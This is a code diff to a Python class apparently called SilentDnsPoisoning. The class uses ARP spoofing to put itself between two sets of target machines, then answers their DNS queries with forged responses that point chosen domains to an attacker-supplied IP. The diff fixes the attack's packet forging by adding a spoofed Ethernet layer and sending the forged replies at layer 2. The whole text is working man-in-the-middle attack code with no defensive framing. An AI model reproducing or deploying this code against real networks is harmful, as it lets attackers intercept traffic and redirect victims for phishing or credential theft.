@@ -12,15 +12,14 @@ class SilentDnsPoisoning:
     def doPoison(self, target1, target2, target1MAC, target2MAC, url, ipPoison, timeSleep):
 
         def makeFakePacket(pkt, target1, target2, target1MAC, target2MAC, url, ipPoison, interface):
-            if pkt.haslayer(ARP):
-                print("ARP packet: do not redirect")
-            else:
+            if pkt.haslayer(IP) and pkt.haslayer(Ether):
                 # if source is target 1 then someone from target 2 must be the true receiver
                 if pkt[Ether].src in target1MAC:
                     print("Traffic from machine 1")
                     found = False
                     # find true receiver (the mac of true receiver)
                     receiver = pkt[IP].dst
+                    oldEtherSource = pkt[Ether].src
                     for i in range(len(target2)):
                         if receiver == target2[i]:
                             # we are the source now cause target 2 thinks we are target 1
@@ -39,6 +38,7 @@ class SilentDnsPoisoning:
                                     # but make a fake response query
                                     if link in pkt[DNS].qd.qname:
                                         linkPresent = True
+                                        fakeEther = Ether(src=pkt[Ether].src, dst=oldEtherSource)
                                         # for a response revert destination and source
                                         fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
                                         fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
@@ -47,10 +47,11 @@ class SilentDnsPoisoning:
                                         # fake DNS response
                                         fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
                                         # combine into complete packet
-                                        poisonPacket = fakeIP / fakeUDP / fakeDNS
+                                        poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
                                         # send the poison packet to the victim
-                                        send(poisonPacket, verbose=0, iface=interface)
-                                        print("Fake packet sent")
+                                        sendp(poisonPacket, verbose=0, iface=interface)
+                                        print("fake DNS response sent")
+                                        break
                                 if linkPresent == False:
                                     # No link match -> resend the DNS request to its true receiver
                                     sendp(pkt, iface=interface)
@@ -73,6 +74,7 @@ class SilentDnsPoisoning:
                             break
                     if found:
                         sendp(pkt, iface=interface)
+                        
         arpSpoofing = ArpSpoofing(self.interface)
         try:
             print("before thread")
